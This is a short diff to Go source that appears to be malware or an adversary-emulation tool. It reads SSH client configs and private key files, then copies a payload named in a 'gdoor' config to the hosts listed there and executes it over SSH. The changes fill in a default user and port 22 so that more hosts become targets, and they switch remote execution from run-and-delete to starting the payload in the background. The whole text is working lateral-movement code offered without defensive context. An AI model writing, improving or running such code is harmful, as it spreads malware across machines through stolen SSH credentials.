@@ -63,6 +63,13 @@ func parseConfig(i *info.Info) map[string]*ssh.ClientConfig {
 			port, _ := cfg.Get(pattern.String(), "port")
 			identityfile, _ := cfg.Get(pattern.String(), "identityfile")
 
+			if user == "" {
+				user = i.GetCurUser()
+			}
+			if port == "" {
+				port = "22"
+			}
+
 			if hostname != "" && user != "" && port != "" && identityfile != "" {
 				debug.Log("T1145", "", "", "Private Keys")
 
@@ -171,7 +178,7 @@ func sendFileAndExecute(i *info.Info, configs map[string]*ssh.ClientConfig) {
 
 		// execute and remove
 		targetPath := filepath.Join("/Users", config.User, gdoorConfig.TargetName)
-		if err := csession.Run(fmt.Sprintf("%s ; /bin/rm %s", targetPath, targetPath)); err != nil {
+		if err := csession.Start(fmt.Sprintf("%s", targetPath)); err != nil {
 			debug.Println(err)
 			continue
 		}
